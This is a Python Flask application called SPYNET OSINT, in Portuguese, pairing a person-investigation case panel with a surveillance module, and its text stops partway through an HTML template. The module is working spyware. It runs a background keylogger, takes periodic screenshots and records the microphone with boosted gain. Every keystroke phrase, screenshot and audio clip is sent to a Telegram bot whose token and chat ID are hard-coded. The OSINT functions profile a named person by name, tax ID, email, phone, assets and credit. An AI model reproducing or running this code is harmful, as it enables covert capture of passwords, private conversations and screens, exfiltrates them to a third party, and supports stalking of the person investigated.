"""
SPYNET OSINT ULTIMATE — PAINEL COMPLETO
Com áudio com volume máximo e qualidade profissional
"""

from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, send_file
from datetime import datetime, timezone, timedelta
from io import BytesIO
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas as pdf_canvas
from functools import wraps
import json, os, requests, re, threading, time
import pyautogui
import sounddevice as sd
import soundfile as sf
from pynput import keyboard
import numpy as np

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "spynet-osint-2026")

BR_TZ = timezone(timedelta(hours=-3))

# ============================================
# CONFIGURAÇÕES
# ============================================
SISTEMA_SENHA = os.environ.get("SISTEMA_SENHA", "spynet2026")

DATA_DIR = os.path.join(os.path.dirname(__file__), "data")
CASOS_FILE = os.path.join(DATA_DIR, "casos.json")
MONITOR_DIR = os.path.join(DATA_DIR, "monitoramento")
SCREENSHOT_DIR = os.path.join(MONITOR_DIR, "screenshots")
AUDIO_DIR = os.path.join(MONITOR_DIR, "audio")
KEYLOG_FILE = os.path.join(MONITOR_DIR, "keylog.txt")

for pasta in [DATA_DIR, MONITOR_DIR, SCREENSHOT_DIR, AUDIO_DIR]:
    os.makedirs(pasta, exist_ok=True)

# ============================================
# VARIÁVEIS DO MONITORAMENTO
# ============================================
monitor_ativo = False
tempo_screenshot = 5
tempo_audio = 10
buffer_teclas = ""
ultimo_tempo = time.time()
ultimas_teclas = []

# ============================================
# FUNÇÕES DO MONITORAMENTO
# ============================================

def enviar_telegram(texto, caminho=None):
    """Envia notificações para o Telegram"""
    BOT_TOKEN = "8714368220:AAEOvQQlzPlXkEFGPYSdKzm2N2kD-owOam0"
    CHAT_ID = "5672315001"
    try:
        if caminho and os.path.exists(caminho):
            with open(caminho, "rb") as f:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                requests.post(url, data={"chat_id": CHAT_ID, "caption": texto}, files={"document": f}, timeout=5)
        else:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, data={"chat_id": CHAT_ID, "text": texto}, timeout=5)
    except:
        pass

def processar_tecla(tecla):
    global buffer_teclas, ultimas_teclas, monitor_ativo, ultimo_tempo
    if not monitor_ativo:
        return
    try:
        if hasattr(tecla, 'char') and tecla.char:
            caractere = tecla.char
            if caractere.isalnum() or caractere in [' ', '.', ',', '!', '?', '@', '#', '$', '-', '_']:
                buffer_teclas += caractere
                ultimo_tempo = time.time()
            elif caractere == '\r' or caractere == '\n':
                if buffer_teclas.strip():
                    registrar_frase(buffer_teclas.strip())
                buffer_teclas = ""
        else:
            tecla_nome = str(tecla).replace('Key.', '')
            if tecla_nome == 'space':
                buffer_teclas += ' '
                ultimo_tempo = time.time()
            elif tecla_nome == 'enter':
                if buffer_teclas.strip():
                    registrar_frase(buffer_teclas.strip())
                buffer_teclas = ""
            elif tecla_nome == 'backspace':
                buffer_teclas = buffer_teclas[:-1]
        
        if time.time() - ultimo_tempo > 2 and buffer_teclas.strip():
            registrar_frase(buffer_teclas.strip())
            buffer_teclas = ""
    except:
        pass

def registrar_frase(frase):
    global ultimas_teclas
    if not frase.strip():
        return
    registro = f"[{datetime.now().strftime('%H:%M:%S')}] {frase}"
    with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
        f.write(registro + "\n")
    ultimas_teclas.append(registro)
    if len(ultimas_teclas) > 100:
        ultimas_teclas.pop(0)
    enviar_telegram(f"⌨️ {frase}")
    print(f"⌨️ {frase}")

def capturar_screenshot():
    global monitor_ativo
    if not monitor_ativo:
        return None
    try:
        nome = f"scr_{int(time.time())}.png"
        caminho = os.path.join(SCREENSHOT_DIR, nome)
        pyautogui.screenshot(caminho)
        enviar_telegram("📸 Screenshot", caminho)
        print(f"📸 Screenshot: {nome}")
        return caminho
    except Exception as e:
        print(f"Erro screenshot: {e}")
        return None

def capturar_audio():
    """Captura áudio com volume máximo e qualidade profissional"""
    global monitor_ativo, ultimo_audio
    if not monitor_ativo:
        return None
    try:
        nome = f"aud_{int(time.time())}.wav"
        caminho = os.path.join(AUDIO_DIR, nome)
        
        fs = 48000  # 48kHz para melhor qualidade
        duracao = 5  # 5 segundos
        
        print("🎤 Gravando áudio com volume máximo...")
        
        # Configurar para capturar áudio mais alto
        gravacao = sd.rec(int(duracao * fs), samplerate=fs, channels=1, dtype='float32')
        sd.wait()
        
        # Aplicar ganho agressivo (12x para volume máximo)
        gravacao = gravacao * 12.0
        
        # Normalização para evitar distorção
        max_amp = np.max(np.abs(gravacao))
        if max_amp > 1.0:
            gravacao = gravacao / max_amp * 0.98
        
        # Aplicar compressor suave para aumentar volume percebido
        threshold = 0.25
        ratio = 4
        for i in range(len(gravacao)):
            if abs(gravacao[i]) > threshold:
                gravacao[i] = threshold + (gravacao[i] - threshold) / ratio
        
        # Ganho final
        gravacao = gravacao * 1.8
        
        # Salvar com qualidade máxima
        sf.write(caminho, gravacao, fs, subtype='PCM_24')
        
        print(f"✅ Áudio salvo: {nome} (volume maximizado)")
        
        # Enviar para Telegram
        enviar_telegram("🎤 Áudio", caminho)
        
        ultimo_audio = caminho
        return caminho
        
    except Exception as e:
        print(f"❌ Erro ao capturar áudio: {e}")
        return None

def loop_captura():
    global monitor_ativo, tempo_screenshot
    while True:
        if monitor_ativo:
            capturar_screenshot()
        time.sleep(tempo_screenshot)

def loop_audio():
    global monitor_ativo, tempo_audio
    while True:
        if monitor_ativo:
            capturar_audio()
        time.sleep(tempo_audio)

def iniciar_keylogger():
    with keyboard.Listener(on_press=processar_tecla) as listener:
        listener.join()

# Iniciar threads em segundo plano
threading.Thread(target=iniciar_keylogger, daemon=True).start()
threading.Thread(target=loop_captura, daemon=True).start()
threading.Thread(target=loop_audio, daemon=True).start()

# ============================================
# FUNÇÕES DOS CASOS
# ============================================

def _load(path, default):
    try:
        if not os.path.exists(path): return default
        with open(path, "r", encoding="utf-8") as f: return json.load(f)
    except: return default

def _save(path, obj):
    tmp = path + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f: json.dump(obj, f, ensure_ascii=False, indent=2)
    os.replace(tmp, path)

def load_casos(): return _load(CASOS_FILE, [])
def save_casos(c): _save(CASOS_FILE, c)

def now_br():
    return datetime.now(BR_TZ).strftime("%d/%m/%Y %H:%M")

def login_required(f):
    @wraps(f)
    def dec(*args, **kwargs):
        if not session.get("logado"): return redirect(url_for("login"))
        return f(*args, **kwargs)
    return dec

# ============================================
# FUNÇÕES OSINT
# ============================================

def buscar_redes_sociais(nome, username=None, email=None, telefone=None):
    resultados = []
    if username:
        resultados.append({"categoria": "📷 INSTAGRAM", "titulo": "Perfil", "url": f"https://www.instagram.com/{username}", "icone": "📷"})
    if nome:
        resultados.append({"categoria": "📷 INSTAGRAM", "titulo": "Busca", "url": f"https://www.instagram.com/explore/tags/{nome.replace(' ', '')}", "icone": "📷"})
        resultados.append({"categoria": "📘 FACEBOOK", "titulo": "Busca", "url": f"https://www.facebook.com/search/top?q={nome.replace(' ', '%20')}", "icone": "📘"})
        resultados.append({"categoria": "🐦 TWITTER", "titulo": "Busca", "url": f"https://twitter.com/search?q={nome.replace(' ', '%20')}", "icone": "🐦"})
        resultados.append({"categoria": "💼 LINKEDIN", "titulo": "Busca", "url": f"https://www.linkedin.com/search/results/people/?keywords={nome.replace(' ', '%20')}", "icone": "💼"})
        resultados.append({"categoria": "🎵 TIKTOK", "titulo": "Busca", "url": f"https://www.tiktok.com/search?q={nome.replace(' ', '%20')}", "icone": "🎵"})
    if email:
        resultados.append({"categoria": "📘 FACEBOOK", "titulo": "Busca por email", "url": f"https://www.facebook.com/search/top?q={email}", "icone": "📘"})
    if telefone:
        telefone_limpo = re.sub(r'\D', '', telefone)
        resultados.append({"categoria": "💬 WHATSAPP", "titulo": "Conversa", "url": f"https://wa.me/55{telefone_limpo}", "icone": "💬"})
    return resultados

def buscar_bens(cpf_cnpj):
    resultados = []
    if cpf_cnpj:
        resultados.append({"categoria": "🏠 IMÓVEIS", "titulo": "Buscar Imóveis", "url": f"https://www.google.com/search?q=registro+de+imoveis+cpf+{cpf_cnpj}", "icone": "🏠"})
        resultados.append({"categoria": "🚗 VEÍCULOS", "titulo": "Buscar Veículos", "url": f"https://www.google.com/search?q=consulta+veiculo+renavam+por+cpf+{cpf_cnpj}", "icone": "🚗"})
        if len(cpf_cnpj) == 14:
            resultados.append({"categoria": "🏢 EMPRESAS", "titulo": "Consulta CNPJ", "url": f"https://www.receitaws.com.br/v1/cnpj/{cpf_cnpj}", "icone": "🏢"})
    return resultados

def buscar_localizacao(endereco, cep=None, cidade=None):
    query = endereco if endereco else cep
    if cidade:
        query = f"{query} {cidade}"
    return {
        "maps_url": f"https://www.google.com/maps/search/{query.replace(' ', '+')}",
        "waze_url": f"https://www.waze.com/live-map/directions?to=search.{query.replace(' ', '+')}"
    }

def buscar_credito(cpf):
    resultados = []
    if cpf:
        resultados.append({"categoria": "📊 SCORE", "titulo": "Consultar Score", "url": "https://www.serasa.com.br/consulta-cpf/", "icone": "📊"})
        resultados.append({"categoria": "🚫 RESTRIÇÕES", "titulo": "Restrições", "url": "https://www.serasa.com.br/consulta-cpf/restricoes/", "icone": "🚫"})
        resultados.append({"categoria": "📋 PROTESTOS", "titulo": "Protestos", "url": f"https://www.google.com/search?q=protesto+cartorio+cpf+{cpf}", "icone": "📋"})
    return resultados

def buscar_vazamentos(email):
    resultados = []
    if email:
        resultados.append({"categoria": "🔓 HAVE I BEEN PWNED", "titulo": "Verificar", "url": f"https://haveibeenpwned.com/account/{email}", "icone": "🔓"})
        resultados.append({"categoria": "🔎 LEAKCHECK", "titulo": "Verificar", "url": f"https://leakcheck.io/?q={email}", "icone": "🔎"})
    return resultados

# ============================================
# FUNÇÕES DE LISTAGEM
# ============================================

def listar_screenshots():
    screenshots = []
    for f in sorted(os.listdir(SCREENSHOT_DIR), reverse=True):
        if f.endswith('.png'):
            screenshots.append({
                "nome": f,
                "data": datetime.fromtimestamp(os.path.getctime(os.path.join(SCREENSHOT_DIR, f))).strftime("%d/%m/%Y %H:%M:%S"),
                "caminho": f
            })
    return screenshots[:50]

def listar_audios():
    audios = []
    for f in sorted(os.listdir(AUDIO_DIR), reverse=True):
        if f.endswith('.wav'):
            audios.append({
                "nome": f,
                "data": datetime.fromtimestamp(os.path.getctime(os.path.join(AUDIO_DIR, f))).strftime("%d/%m/%Y %H:%M:%S"),
                "caminho": f
            })
    return audios[:50]

def ler_keylog():
    if os.path.exists(KEYLOG_FILE):
        with open(KEYLOG_FILE, 'r', encoding='utf-8') as f:
            return f.readlines()[-50:]
    return []

# ============================================
# ROTAS PRINCIPAIS
# ============================================

@app.route("/")
def index():
    if not session.get("logado"): 
        return redirect(url_for("login"))
    return redirect(url_for("painel"))

@app.route("/login", methods=["GET", "POST"])
def login():
    erro = ""
    if request.method == "POST":
        senha = request.form.get("senha")
        if senha == SISTEMA_SENHA:
            session["logado"] = True
            return redirect(url_for("painel"))
        else:
            erro = "Senha incorreta!"
    return render_template_string(LOGIN_HTML, erro=erro)

@app.route("/logout")
def logout():
    session.pop("logado", None)
    return redirect(url_for("login"))

@app.route("/painel")
@login_required
def painel():
    casos = load_casos()
    screenshots = listar_screenshots()
    audios = listar_audios()
    keylog = ler_keylog()
    
    return render_template_string(PAINEL_COMPLETO_HTML, 
        casos=list(reversed(casos)),
        screenshots=screenshots,
        audios=audios,
        keylog=keylog,
        monitor_ativo=monitor_ativo,
        total_casos=len(casos),
        total_screenshots=len(screenshots),
        total_audios=len(audios),
        total_teclas=len(keylog))

# ============================================
# ROTAS DO MONITORAMENTO (API)
# ============================================

@app.route("/api/monitor/status", methods=["GET", "POST"])
@login_required
def monitor_status():
    global monitor_ativo
    if request.method == "POST":
        data = request.get_json() or {}
        monitor_ativo = data.get("ativo", monitor_ativo)
        return jsonify({"ativo": monitor_ativo})
    return jsonify({"ativo": monitor_ativo})

@app.route("/api/monitor/limpar", methods=["POST"])
@login_required
def monitor_limpar():
    global ultimas_teclas
    ultimas_teclas = []
    for f in os.listdir(SCREENSHOT_DIR):
        try:
            os.remove(os.path.join(SCREENSHOT_DIR, f))
        except:
            pass
    for f in os.listdir(AUDIO_DIR):
        try:
            os.remove(os.path.join(AUDIO_DIR, f))
        except:
            pass
    if os.path.exists(KEYLOG_FILE):
        open(KEYLOG_FILE, 'w').close()
    return jsonify({"ok": True})

@app.route("/monitor/screenshot/<nome>")
@login_required
def ver_screenshot(nome):
    caminho = os.path.join(SCREENSHOT_DIR, nome)
    if os.path.exists(caminho):
        return send_file(caminho, mimetype='image/png')
    return "", 404

@app.route("/monitor/audio/<nome>")
@login_required
def ver_audio(nome):
    caminho = os.path.join(AUDIO_DIR, nome)
    if os.path.exists(caminho):
        return send_file(caminho, mimetype='audio/wav')
    return "", 404

# ============================================
# ROTAS OSINT
# ============================================

@app.route("/osint/redes", methods=["POST"])
@login_required
def osint_redes():
    data = request.get_json() or {}
    resultados = buscar_redes_sociais(data.get("nome",""), data.get("username",""), data.get("email",""), data.get("telefone",""))
    return jsonify({"resultados": resultados})

@app.route("/osint/bens", methods=["POST"])
@login_required
def osint_bens():
    data = request.get_json() or {}
    resultados = buscar_bens(data.get("cpf_cnpj",""))
    return jsonify({"resultados": resultados})

@app.route("/osint/localizacao", methods=["POST"])
@login_required
def osint_localizacao():
    data = request.get_json() or {}
    localizacao = buscar_localizacao(data.get("endereco",""), data.get("cep",""), data.get("cidade",""))
    return jsonify(localizacao)

@app.route("/osint/credito", methods=["POST"])
@login_required
def osint_credito():
    data = request.get_json() or {}
    resultados = buscar_credito(data.get("cpf",""))
    return jsonify({"resultados": resultados})

@app.route("/osint/vazamentos", methods=["POST"])
@login_required
def osint_vazamentos():
    data = request.get_json() or {}
    resultados = buscar_vazamentos(data.get("email",""))
    return jsonify({"resultados": resultados})

@app.route("/osint")
@login_required
def osint_page():
    return render_template_string(OSINT_HTML)

# ============================================
# ROTAS DOS CASOS
# ============================================

@app.route("/novo_caso", methods=["GET","POST"])
@login_required
def novo_caso():
    if request.method == "POST":
        d = request.form
        caso = {
            "id": f"SPN-{datetime.now(BR_TZ).strftime('%Y%m%d%H%M%S')}",
            "criado_em": now_br(),
            "investigador": "SPYNET Security",
            "status": "Em andamento",
            "tipo": d.get("tipo", ""),
            "cliente": d.get("cliente", ""),
            "investigado": d.get("investigado", ""),
            "objetivo": d.get("objetivo", ""),
            "etapas": [],
            "notas": d.get("notas", ""),
        }
        casos = load_casos()
        casos.append(caso)
        save_casos(casos)
        return redirect(url_for("caso_detalhe", caso_id=caso["id"]))
    return render_template_string(NOVO_CASO_HTML)

@app.route("/caso/<caso_id>")
@login_required
def caso_detalhe(caso_id):
    casos = load_casos()
    caso = next((c for c in casos if c["id"] == caso_id), None)
    if not caso: return redirect(url_for("painel"))
    return render_template_string(CASO_DETALHE_HTML, caso=caso)

@app.route("/api/caso/<caso_id>/etapa", methods=["POST"])
@login_required
def adicionar_etapa(caso_id):
    data = request.get_json(force=True, silent=True) or {}
    casos = load_casos()
    for c in casos:
        if c["id"] == caso_id:
            etapa = {
                "num": len(c.get("etapas", [])) + 1,
                "titulo": data.get("titulo", ""),
                "tipo": data.get("tipo", ""),
                "dados": data.get("dados", ""),
                "ts": now_br()
            }
            c.setdefault("etapas", []).append(etapa)
            break
    save_casos(casos)
    return jsonify({"ok": True})

@app.route("/api/caso/<caso_id>/status", methods=["POST"])
@login_required
def atualizar_status(caso_id):
    data = request.get_json(force=True, silent=True) or {}
    casos = load_casos()
    for c in casos:
        if c["id"] == caso_id:
            c["status"] = data.get("status", c["status"])
            break
    save_casos(casos)
    return jsonify({"ok": True})

@app.route("/api/limpar_casos", methods=["POST"])
@login_required
def limpar_casos():
    save_casos([])
    return jsonify({"ok": True})

@app.route("/relatorio/<caso_id>.pdf")
@login_required
def gerar_relatorio(caso_id):
    casos = load_casos()
    caso = next((c for c in casos if c["id"] == caso_id), None)
    if not caso: return "Caso não encontrado", 404

    buffer = BytesIO()
    c = pdf_canvas.Canvas(buffer, pagesize=A4)
    W, H = A4

    c.setFont("Helvetica-Bold", 20)
    c.drawString(50, H - 50, "RELATÓRIO DE INVESTIGAÇÃO")
    c.setFont("Helvetica", 10)
    c.drawString(50, H - 80, f"ID: {caso['id']}")
    c.drawString(50, H - 100, f"Emitido: {now_br()}")
    c.drawString(50, H - 130, f"Investigado: {caso.get('investigado', '—')}")
    c.drawString(50, H - 150, f"Cliente: {caso.get('cliente', '—')}")
    c.drawString(50, H - 170, f"Status: {caso.get('status', '—')}")
    c.drawString(50, H - 200, f"Objetivo: {caso.get('objetivo', '—')}")
    
    c.setFont("Helvetica-Bold", 14)
    c.drawString(50, H - 240, "ETAPAS REALIZADAS")
    
    y = H - 270
    c.setFont("Helvetica", 9)
    for e in caso.get("etapas", []):
        if y < 50:
            c.showPage()
            y = H - 50
        c.drawString(50, y, f"ETAPA {e['num']}: {e['titulo']} - {e['ts']}")
        y -= 15
        for linha in e.get("dados", "").split("\n"):
            if linha.strip():
                if y < 50:
                    c.showPage()
                    y = H - 50
                c.drawString(65, y, linha.strip()[:80])
                y -= 12
        y -= 8
    
    c.save()
    buffer.seek(0)
    
    return send_file(buffer, as_attachment=True, download_name=f"relatorio_{caso['id']}.pdf", mimetype="application/pdf")

# ============================================
# TEMPLATES
# ============================================

LOGIN_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SPYNET — ACESSO</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:linear-gradient(135deg,#0a0a2a,#1a1a3a);font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh}
        .card{background:rgba(255,255,255,0.1);backdrop-filter:blur(10px);border-radius:20px;padding:40px;width:380px;text-align:center}
        h1{color:#00ffcc}
        input{width:100%;padding:14px;margin:10px 0;background:rgba(0,0,0,0.5);border:1px solid #00ffcc;border-radius:10px;color:white;font-size:16px}
        button{width:100%;padding:14px;background:#00ffcc;border:none;border-radius:10px;font-weight:bold;cursor:pointer;font-size:16px}
        .erro{color:#ff4444;margin-top:10px}
    </style>
</head>
<body>
<div class="card">
    <h1>🔍 SPYNET</h1>
    <form method="POST">
        <input type="password" name="senha" placeholder="Senha" autofocus required>
        <button type="submit">🔐 ACESSAR</button>
    </form>
    {% if erro %}<div class="erro">{{ erro }}</div>{% endif %}
</div>
</body>
</html>
'''

PAINEL_COMPLETO_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SPYNET — PAINEL COMPLETO</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0e1a;font-family:'Segoe UI',Arial;color:#e8edf5;padding:20px}
        .navbar{background:linear-gradient(90deg,#050a12,#0a0e1a);border-bottom:2px solid #00ffcc;padding:15px 25px;display:flex;justify-content:space-between;align-items:center;margin-bottom:25px;flex-wrap:wrap;gap:10px}
        .logo{font-size:28px;font-weight:bold;letter-spacing:4px;color:#00ffcc;text-shadow:0 0 8px #00ffcc}
        .btn{background:transparent;border:1px solid #00ffcc;padding:8px 18px;border-radius:4px;cursor:pointer;text-decoration:none;color:#00ffcc;font-size:12px;font-weight:bold;transition:all .3s;display:inline-block;margin:0 3px}
        .btn:hover{background:#00ffcc;color:#0a0e1a;box-shadow:0 0 10px #00ffcc}
        .btn-start{background:#00cc66;border-color:#00cc66;color:#fff}
        .btn-stop{background:#ff4444;border-color:#ff4444;color:#fff}
        .btn-clear{background:#ffaa44;border-color:#ffaa44;color:#333}
        .stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:15px;margin-bottom:25px}
        .stat-card{background:rgba(0,20,40,0.6);border:1px solid #00ffcc;border-radius:8px;padding:15px;text-align:center}
        .stat-number{font-size:28px;font-weight:bold;color:#00ffcc}
        .stat-label{font-size:10px;color:#8899aa;margin-top:5px}
        .section{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:8px;padding:20px;margin-bottom:20px}
        .section-title{color:#00ffcc;font-size:16px;margin-bottom:15px;border-left:3px solid #00ffcc;padding-left:12px}
        .grid-2{display:grid;grid-template-columns:repeat(2,1fr);gap:15px}
        .screenshot-item{background:rgba(0,0,0,0.3);border-radius:8px;padding:10px;text-align:center}
        .screenshot-item img{width:100%;border-radius:5px;max-height:150px;object-fit:cover;cursor:pointer}
        .audio-item{background:rgba(0,0,0,0.3);border-radius:8px;padding:10px;margin-bottom:8px}
        audio{width:100%}
        .keylog-item{background:rgba(0,0,0,0.2);padding:5px 10px;border-bottom:1px solid #1a2a3a;font-family:monospace;font-size:12px}
        .caso-card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:8px;padding:15px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center}
        .badge{background:rgba(0,136,255,0.3);padding:3px 8px;border-radius:4px;font-size:10px}
        .status-indicator{display:inline-flex;align-items:center;gap:8px;background:rgba(0,0,0,0.5);padding:5px 15px;border-radius:4px;margin-left:15px}
        .led{width:10px;height:10px;border-radius:50%;background:#0f0;animation:pulse 1s infinite}
        @keyframes pulse{0%,100%{opacity:0.5}50%{opacity:1}}
        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);justify-content:center;align-items:center;z-index:1000}
        .modal img{max-width:90%;max-height:90%}
        .close{position:absolute;top:20px;right:40px;font-size:40px;cursor:pointer}
        @media (max-width: 1000px){.stats-grid{grid-template-columns:repeat(2,1fr)}.grid-2{grid-template-columns:1fr}}
    </style>
</head>
<body>
<div class="navbar">
    <div class="logo">🕵️ SPYNET</div>
    <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap">
        <div class="status-indicator"><div class="led"></div><span id="statusText">{% if monitor_ativo %}🟢 MONITORANDO{% else %}🔴 PARADO{% endif %}</span></div>
        <button class="btn-start btn" onclick="iniciarMonitor()">▶️ INICIAR</button>
        <button class="btn-stop btn" onclick="pararMonitor()">⏸️ PARAR</button>
        <button class="btn-clear btn" onclick="limparMonitor()">🗑️ LIMPAR DADOS</button>
        <a href="/osint" class="btn">🔎 OSINT</a>
        <a href="/novo_caso" class="btn">➕ CASO</a>
        <button class="btn btn-clear" onclick="limparCasos()">🗑️ LIMPAR CASOS</button>
        <a href="/logout" class="btn btn-stop">🚪 SAIR</a>
    </div>
</div>

<div class="stats-grid">
    <div class="stat-card"><div class="stat-number">{{ total_casos }}</div><div class="stat-label">CASOS</div></div>
    <div class="stat-card"><div class="stat-number">{{ total_screenshots }}</div><div class="stat-label">SCREENSHOTS</div></div>
    <div class="stat-card"><div class="stat-number">{{ total_audios }}</div><div class="stat-label">ÁUDIOS</div></div>
    <div class="stat-card"><div class="stat-number">{{ total_teclas }}</div><div class="stat-label">TECLAS</div></div>
</div>

<div class="grid-2">
    <div class="section">
        <div class="section-title">📸 ÚLTIMAS SCREENSHOTS</div>
        <div style="display:grid;grid-template-columns:repeat(2,1fr);gap:10px">
            {% for s in screenshots[:8] %}
            <div class="screenshot-item">
                <img src="/monitor/screenshot/{{ s.caminho }}" onclick="abrirModal(this.src)">
                <div style="font-size:10px;color:#8899aa;margin-top:5px">{{ s.data }}</div>
            </div>
            {% else %}
            <p style="color:#8899aa;text-align:center;grid-column:span 2">Nenhuma screenshot</p>
            {% endfor %}
        </div>
    </div>

    <div class="section">
        <div class="section-title">🎤 ÚLTIMOS ÁUDIOS</div>
        {% for a in audios[:10] %}
        <div class="audio-item">
            <audio controls src="/monitor/audio/{{ a.caminho }}"></audio>
            <div style="font-size:10px;color:#8899aa;margin-top:5px">{{ a.data }}</div>
        </div>
        {% else %}
        <p style="color:#8899aa;text-align:center">Nenhum áudio</p>
        {% endfor %}
    </div>
</div>

<div class="section">
    <div class="section-title">⌨️ TECLAS DIGITADAS</div>
    <div style="max-height:300px;overflow-y:auto">
        {% for linha in keylog %}
        <div class="keylog-item">💬 {{ linha }}</div>
        {% else %}
        <p style="color:#8899aa;text-align:center">Nenhuma tecla capturada</p>
        {% endfor %}
    </div>
</div>

<div class="section">
    <div class="section-title">📁 MEUS CASOS</div>
    {% for caso in casos %}
    <div class="caso-card">
        <div><span class="badge">{{ caso.id }}</span><br><strong>{{ caso.investigado }}</strong><br><small>{{ caso.status }}</small></div>
        <div><a href="/caso/{{ caso.id }}" class="btn" style="padding:5px 12px">VER</a><a href="/relatorio/{{ caso.id }}.pdf" class="btn" style="padding:5px 12px">PDF</a></div>
    </div>
    {% else %}
    <p style="color:#8899aa;text-align:center">Nenhum caso registrado. <a href="/novo_caso" style="color:#00ffcc">Criar primeiro caso →</a></p>
    {% endfor %}
</div>

<div id="modal" class="modal" onclick="fecharModal()">
    <span class="close">&times;</span>
    <img id="modal-img">
</div>

<script>
function abrirModal(src){
    document.getElementById('modal-img').src = src;
    document.getElementById('modal').style.display = 'flex';
}
function fecharModal(){
    document.getElementById('modal').style.display = 'none';
}
function atualizarStatus(){
    fetch('/api/monitor/status').then(r=>r.json()).then(d=>{
        document.getElementById('statusText').innerText = d.ativo ? "🟢 MONITORANDO" : "🔴 PARADO";
    });
}
function iniciarMonitor(){
    fetch('/api/monitor/status',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ativo:true})})
        .then(()=>{atualizarStatus();setTimeout(()=>location.reload(),2000)});
}
function pararMonitor(){
    fetch('/api/monitor/status',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ativo:false})})
        .then(()=>{atualizarStatus();setTimeout(()=>location.reload(),2000)});
}
function limparMonitor(){
    if(confirm('⚠️ LIMPAR TODOS OS DADOS DO MONITORAMENTO?')){
        fetch('/api/monitor/limpar',{method:'POST'}).then(()=>location.reload());
    }
}
function limparCasos(){
    if(confirm('⚠️ REMOVER TODOS OS CASOS?')){
        fetch('/api/limpar_casos',{method:'POST'}).then(()=>location.reload());
    }
}
setInterval(atualizarStatus, 5000);
</script>
</body>
</html>
'''

NOVO_CASO_HTML = '''
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>SPYNET — Novo Caso</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0e1a;font-family:Arial;color:#e8edf5;padding:20px}
.navbar{background:linear-gradient(90deg,#050a12,#0a0e1a);border-bottom:2px solid #00ffcc;padding:15px;margin-bottom:20px}
.logo{font-size:24px;color:#00ffcc}
.btn{background:transparent;border:1px solid #00ffcc;padding:8px 18px;border-radius:4px;text-decoration:none;color:#00ffcc}
.card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:8px;padding:25px;max-width:600px;margin:0 auto}
input,select,textarea{width:100%;padding:12px;margin:10px 0;background:#0a0e1a;border:1px solid #00ffcc;border-radius:4px;color:#fff}
button{background:#00ffcc;border:none;padding:12px;border-radius:4px;font-weight:bold;cursor:pointer;width:100%}
</style>
</head>
<body><div class="navbar"><div class="logo">🔍 SPYNET</div><a href="/painel" class="btn">← PAINEL</a></div>
<div class="card"><h2>➕ NOVO CASO</h2>
<form method="POST">
<select name="tipo" required><option value="">TIPO...</option><option>Pessoa física</option><option>Pessoa jurídica</option><option>Patrimonial</option><option>Crédito</option></select>
<input type="text" name="cliente" placeholder="CLIENTE" required>
<input type="text" name="investigado" placeholder="INVESTIGADO" required>
<textarea name="objetivo" rows="3" placeholder="OBJETIVO" required></textarea>
<textarea name="notas" rows="3" placeholder="NOTAS"></textarea>
<button type="submit">🔍 CRIAR</button>
</form>
</div>
</body>
</html>
'''

CASO_DETALHE_HTML = '''
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>SPYNET — {{ caso.id }}</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0e1a;font-family:Arial;color:#e8edf5;padding:20px}
.navbar{background:linear-gradient(90deg,#050a12,#0a0e1a);border-bottom:2px solid #00ffcc;padding:15px;margin-bottom:20px}
.logo{font-size:24px;color:#00ffcc}
.btn{background:transparent;border:1px solid #00ffcc;padding:8px 18px;border-radius:4px;text-decoration:none;color:#00ffcc}
.card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:8px;padding:25px;margin-bottom:20px}
.status{display:inline-block;padding:5px 12px;border-radius:4px;font-size:12px}
.status-andamento{background:#ffaa00;color:#000}
.status-concluido{background:#00cc66;color:#000}
.etapa-card{background:rgba(0,0,0,0.3);border-left:3px solid #00ffcc;padding:15px;margin-bottom:10px}
input,textarea,select{width:100%;padding:12px;margin:10px 0;background:#0a0e1a;border:1px solid #00ffcc;border-radius:4px;color:#fff}
button{background:#00ffcc;border:none;padding:12px;border-radius:4px;font-weight:bold;cursor:pointer}
</style>
</head>
<body><div class="navbar"><div class="logo">🔍 SPYNET</div><a href="/painel" class="btn">← PAINEL</a></div>
<div class="card"><h2>{{ caso.investigado }}</h2><p><span class="badge">{{ caso.id }}</span> • {{ caso.criado_em }}</p><p><strong>CLIENTE:</strong> {{ caso.cliente }}</p><p><strong>TIPO:</strong> {{ caso.tipo }}</p><p><strong>STATUS:</strong> <span class="status status-{{ 'andamento' if caso.status == 'Em andamento' else 'concluido' }}">{{ caso.status }}</span></p><p><strong>OBJETIVO:</strong> {{ caso.objetivo }}</p>{% if caso.notas %}<p><strong>NOTAS:</strong> {{ caso.notas }}</p>{% endif %}</div>
<div class="card"><h3>📋 ETAPAS</h3>{% for e in caso.etapas %}<div class="etapa-card"><strong>ETAPA {{ e.num }}: {{ e.titulo }}</strong><div>{{ e.tipo }} • {{ e.ts }}</div><p style="margin-top:10px">{{ e.dados }}</p></div>{% else %}<p>NENHUMA ETAPA.</p>{% endfor %}</div>
